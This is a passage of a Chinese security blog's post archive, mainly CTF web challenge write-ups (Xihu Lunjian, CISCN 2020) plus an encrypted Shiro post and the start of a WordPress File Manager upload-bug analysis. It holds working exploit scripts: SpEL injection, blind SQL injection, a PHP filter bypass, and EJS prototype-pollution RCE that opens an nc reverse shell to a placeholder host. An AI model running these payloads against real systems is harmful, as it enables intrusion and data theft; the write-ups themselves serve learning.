<p>通过任意文件读取，读到当前进程使用的glibc位置和地址，然后通过修改内存将file_get_contents函数实际调用的open函数的地址，修改为system函数的地址。之后再调用file_get_contents时即调用system函数执行命令。</p>
<p>读libc的地址</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201023195206100.png" alt="image-20201023195206100"></p>
<p>寻找system和open的偏移。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf  -s libc-2.19.so  | egrep "\s(system|open)@@"</span><br><span class="line">//egrep为带正则的匹配相当于 grep -e</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201023194250256.png" alt="image-20201023194250256"></p>
<blockquote>
<p>这里有个注意点，在用burp保存二进制文件时，在文件头有一个%7F，如果没复制过来的话，ELF文件就不完整。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="number">0x7ffff5f40000</span>+<span class="number">0x0000000000046590</span>);</span><br><span class="line"><span class="comment">//system函数结果：0x7ffff5f86590*</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x04-easyjson"><a href="#0x04-easyjson" class="headerlink" title="0x04 easyjson"></a>0x04 easyjson</h1><p><a href="http://easyjson.xhlj.wetolink.com/" target="_blank" rel="noopener">http://easyjson.xhlj.wetolink.com/</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?source&#x3D;1&amp;action&#x3D;write&amp;filename&#x3D;a.php HTTP&#x2F;1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">Content-Length: 111</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;easyjson.xhlj.wetolink.com</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;easyjson.xhlj.wetolink.com&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">X-Forwarded-For: 23.23.23.23.</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?&#x3D;&#96;\u002f\u0072\u0065\u0061\u0064\u0066\u006c\u0061\u0067&#96;;?&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021204338713.png" alt="image-20201021204338713"></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>参考链接</p>
<p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p>
<p><a href="https://www.bertramc.cn/2020/10/09/66.html" target="_blank" rel="noopener">https://www.bertramc.cn/2020/10/09/66.html</a></p>
<p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
<p><a href="https://mp.weixin.qq.com/s/wOnv-dUMtt1tfp306Fe8oA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wOnv-dUMtt1tfp306Fe8oA</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>若依后台管理系统shiro反序列化漏洞</title>
    <url>/2020/09/18/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5502dfd896daa08e455e0f06ac9d891f9e73c247d3ed621a0325aa866971f4d6">79f895b046debf0182686564293f0bc9766f3882732258faf25e35465b0a54cbcdc22a13e876f920d86b05d2764e07f74afcd53e239518f15050d0087379d72e7a543f875e8b23536617cca65fb96b4cbf4b1a0807620f6de09a097876fca6d45c694c2293b473a3affccb3c4d6f5717a411c823dfa1b43f3cd9fe53c2e176c92c6ccf10c416995bc9707011951f15fa56d61721f36f0810fa8eaccafd7f99e26888e5269c5548b3501fc46e0e2d187fecc7f81142f0b36079887ed55976cd3b66856ac9be78bb9292138b673a275eecd0941e7ac704b9f8aee5dca460fff41713a94567c39163ec078060953908e3ceab66e80772f753b5991ee06ee5bdfe4f07f486b38722502ac48d1b628d5b998edc7fdcce4e9f21d1a5dbf0f34b8ffef9b6f601ee92e6ccdfdab2100b19f8f00beacd7c4c720033bfac4108062387d9c49f2e2eb92b15d227edcc5fa5195c8b2a7a0c24daeb1f172d1ff553b0e8596d34fe58dbb50ec1750a5524ecb67c0111b33405ef2264001b870bad9cbb950840aace2b44bad167421c429563a29472503f9b9f84be6cc526fa7adf2732d02b159dce0c0506f0881bd9ae35c1fa7fb74e2e9764b6785487fa605835ba3c4d2a3aca96cb12a6a6283b043c2f8d7be08345d23d5090c3cd8f16d41b8f37766aac1dd9bc8b2339267d05b2399f8af780a2536036ae9ca3f28c5aa5ad69cc81da531aec2d220a53ceab3e968dc38236d6cb6667197a775ac75a48722c5677d3ee16842ddacaea19f85d1a332539e7553ff6a29bb24a2b0e63c9371844f0b764951b12b633781d7ef8acfc314669a9efe1844d115affa3dcff67a1ec08998794c910ef333ff6c93bbc5663b71cd79236c2dcc21f3133c1f7cb46032c84c8f1e2e5e047e5c7224494b66c346a6bb7be0d3d669e761cc98ad0d092631527d607d0288714b0dbc820048fb97a5e65935f2c1413f47d402dd3614a40bc4e70d73ab534bf9534e644588158cdc1f303290d4fac4e3520a0a00804778f69fe4b7620dfad66cb819c49effa39fbf53b371cab83d28348d6026e73e8b8ea427d82255b417d7a44ca7a6b411f586eb5875e92978ea0a28e4c010efbaaeaf244d0ff94932f1158bc09200d674f184e02c987703e21208dcf062df144eba5edc625aec6ae6bc986481e46bf25d08ebd3979d2c8062cf627e938e173f5848d2d0876e9af9866dad4b596310fb087f5df99218dc779d14630bbdddd8b7bc2cd1176fa06cbc1d379eaae49251b1a2e3be8aba39aed702fcd86036d4193a9b8dc9847ffe6c56844dc436807121c44629569ecad85e51b06f7c6b7b0</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ciscn华东北分区赛web题目wp</title>
    <url>/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/</url>
    <content><![CDATA[<p>前言：2333</p>
<a id="more"></a>

<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>直接访问flag.php就可以了。</p>
<p>感觉预期解应该为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;huadongbei&#x2F;cat.php?s1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Zmlyc3QgYmxvb2Q&#x3D;&amp;s2&#x3D;0e215962017&amp;s3&#x3D;SHELL.TXT HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.43.44</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">file&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>spel表达式注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.class. forName(&quot;java.nio.file.File&quot;).lines(1.class. forName(&quot;java.nio.file.Paths&quot;).get(&quot;&#x2F;flag.txt&quot;)).toArray()[0]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171629921.png" alt="image-20200912171629921"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.104:8080"</span></span><br><span class="line">payload = <span class="string">"1.class.forName(\"java.nio.file.Files\").lines\x00(1.class.forName(\"java.nio.file.Paths\").get\x00(\"/flag.txt\")).toArray()[0]"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">data = &#123;<span class="string">"expr"</span>:payload&#125; </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">re = requests.post(url, data, headers=headers, proxies=proxy)</span><br><span class="line">print(re.content)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171031671.png" alt="image-20200912171031671"></p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>参考：</p>
<p><a href="http://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/" target="_blank" rel="noopener">Nginx错误配置alias导致目录遍历漏洞</a></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912203459538.png" alt="image-20200912203459538"></p>
<p>nginx配置出错，可以读文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name _;</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        alias &#x2F;app&#x2F;static&#x2F;;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">	    proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>express-upload  原型链污染 –&gt;  ejs模板rce。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.7.107</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Length: 261</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&quot;cat &#x2F;flag.txt &gt; aa&quot;);var __tmp</span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912135951627.png" alt="image-20200912135951627"></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171056211.png" alt="image-20200912171056211"></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912140046413.png" alt="image-20200912140046413"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.107/4_pATh_y0u_CaNN07_Gu3ss"</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec(\"curl xxxx:6666\");var __tmp"</span>)</span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc xxx 6666 &gt; /tmp/fa ');var __tmp2"</span></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,payload)</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">re = requests.post(url, files = files, proxies=proxies)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>

<h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://172.20.7.102/index.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span>	</span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload = <span class="string">"||ascii(right(password,&#123;&#125;))/**/&gt;/**/&#123;&#125;#"</span></span><br><span class="line">		payload = payload.format((<span class="number">13</span>-i),mid)</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">"username"</span>:<span class="string">"admin\\"</span>,</span><br><span class="line">			<span class="string">"password"</span>:payload</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">print</span> payload</span><br><span class="line">		r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913125614666.png" alt="image-20200913125614666"></p>
<p>登陆</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'gzmtu'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $gzmtu = $_GET[<span class="string">'gzmtu'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|t|x|\/|;|\"|\'|\`|\||\[|\]|\_|\^|=)/i'</span>,$gzmtu)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'forbidden'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $gzmtu)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'nonono!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$gzmtu.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取反绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.7.102&#x2F;c2ZtdHFs.php?gzmtu&#x3D;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98%D1%8B%87%8B)</span><br><span class="line">system(&quot;cat &#x2F;flag.txt&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913121916000.png" alt="image-20200913121916000"></p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>PostgreSQL注入，没做出来。。。。。。</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>修复是才知道是ssrf，</p>
<p>有一个ssrf.php，据说file:///flag 就可以得到flag</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Wordpress File-manager 任意文件上传漏洞分析</title>
    <url>/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>紧急！WordPress文件管理器（file manager）插件爆严重0day漏洞</p>
<a id="more"></a>

<blockquote>
<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">Wordpress File-manager 任意文件上传漏洞分析</a></p>
</blockquote>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p>分析环境：</p>
<ul>
<li>wordpress 5.5.1</li>
<li>file manager 6.0</li>
<li>win10   phpstudy   php 7.0.9</li>
</ul>
<p>漏洞点位于file manager的connector.minimal.php文件，具体路径在<code>wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php</code></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908121359135-1599734770059.png" alt="image-20200908121359135"></p>
<p>首先实例化一个<code>elFinderConnector</code>对象，然后调用它的<code>run()</code>方法，跟进run();</p>
<p>wp-content/plugins/wp-file-manager/lib/php/elFinderConnector.class.php</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908133111974-1599734777018.png" alt="image-20200908133111974"></p>
<p>如果HTTP请求的方法是<code>POST</code>会把<code>POST</code>和<code>GET</code>请求的保存到<code>$src</code>，然后判断<code>POST</code>传的参数。如果不传入<code>targets</code>，就不会进入前几个判断，之后会把<code>POST</code>传的<code>cmd</code>变量赋给<code>$cmd</code>，然后调用<code>commandExists()</code>检测传入的<code>$cmd</code>是否存在。</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908125214608.png" alt="image-20200908125214608" style="zoom:150%;">

<p>然后利用<code>commandArgsList()</code>函数获取<code>$cmd</code>对应的命令参数列表，漏洞利用需要上传文件，这里只关注<code>$cmd</code>为<code>upload</code>的情况。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commandArgsList</span><span class="params">($cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;commandExists($cmd)) &#123;</span><br><span class="line">            $list = <span class="keyword">$this</span>-&gt;commands[$cmd];</span><br><span class="line">            $list[<span class="string">'reqid'</span>] = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $list = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*`upload`对应的数组如下:</span></span><br><span class="line"><span class="comment">'upload' =&gt; array(</span></span><br><span class="line"><span class="comment">    'target' =&gt; true, 'FILES' =&gt; true, 'mimes' =&gt; false, 'html' =&gt; false, 'upload' =&gt; false, </span></span><br><span class="line"><span class="comment">    'name' =&gt; false, 'upload_path' =&gt; false, 'chunk' =&gt; false, 'cid' =&gt; false, 'node' =&gt; false, </span></span><br><span class="line"><span class="comment">    'renames' =&gt; false, 'hashes' =&gt; false, 'suffix' =&gt; false, 'mtime' =&gt; false, 'overwrite' =&gt; false, </span></span><br><span class="line"><span class="comment">    'contentSaveId' =&gt; false)</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>

<p>循环遍历，将<code>POST</code>传入的参数保存到<code>$args</code>数组中，然后调用<code>input_filter()</code>函数对<code>$args</code>进行简单的过滤，</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908130150392.png" alt="image-20200908130150392" style="zoom:150%;">

<p>替换掉<code>%00</code>，并且做<code>stripslashes()</code>处理。然后将通过表单上传的文件<code>$_FILES</code>存到<code>$args[&#39;FILE&#39;]</code>中。然后调用<code>exec()</code>函数，跟进</p>
<p>wp-content/plugins/wp-file-manager/lib/php/elFinder.class.php</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908132919783-1599734791897.png" alt="image-20200908132919783"></p>
<p>前面会进行一些判断，最后进入到<code>$this-&gt;$cmd($args)</code>调用<code>upload()</code>函数，跟进</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908151636282-1599734796269.png" alt="image-20200908151636282"></p>
<p>首先将<code>POST</code>传入的<code>target</code>赋给<code>$target</code>变量，然后调用<code>volume()</code>函数，</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908152053795-1599734798968.png" alt="image-20200908152053795"></p>
<p>可以看到<code>$this-&gt;volume</code>数组含有两项，一项是<code>l1_</code>，一项是<code>t1_</code>，<code>volume()</code>函数定义如果传入的<code>$hash</code>以<code>l1_</code>或<code>t1_</code>开头，返回<code>$this-&gt;volume</code>数组对应的值，否则返回false。在<code>upload</code>函数中会检测<code>$volume</code>，如果其为false，程序会报错结束，所以<code>POST</code>传入的<code>target</code>必须以它们两个为前缀。继续分析upload()函数。依次取出<code>$args</code>数组中的值赋给相应的变量，这里要求<code>$args[&#39;FILES&#39;][&#39;upload&#39;]</code>也就是<code>$_FILES[&#39;upload&#39;]</code>为数组，才能将其赋给<code>$files</code>变量，这就需要上传文件时上传一个文件数组。接下来其他的如<code>html、upload_path、chunk、cid、mtime</code>等参数可以不传。接下来遍历<code>$files[&#39;name&#39;]</code>也就是<code>$_FILES[&#39;upload&#39;][&#39;name&#39;]</code>，如果文件上传成功，将<code>$_FILES[&#39;upload&#39;][&#39;name&#39;]</code>赋给<code>$tmpname</code>，然后调用<code>fopen()</code>打开上传的临时文件，将指针保存在<code>$fp</code>。在不传如<code>upload_path</code>时<code>$thash等于$target</code>，所以<code>$_target</code>为<code>$target</code>为我们<code>POST</code>传入的<code>target</code>变量。之后调用了<code>$volume-&gt;upload()</code>函数，第一个参数为之前打开文件的指针，第二个参数为<code>POST</code>传入的<code>target</code>变量，第三个参数为上传的文件名，第四个参数为空的数组。跟进<code>elFinderVolumeDriver</code>的<code>upload()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($fp, $dst, $name, $tmpname, $hashes = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;commandDisabled(<span class="string">'upload'</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($dir = <span class="keyword">$this</span>-&gt;dir($dst)) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_TRGDIR_NOT_FOUND, <span class="string">'#'</span> . $dst);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dir[<span class="string">'write'</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;nameAccepted($name, <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_INVALID_NAME);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $mimeByName = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span 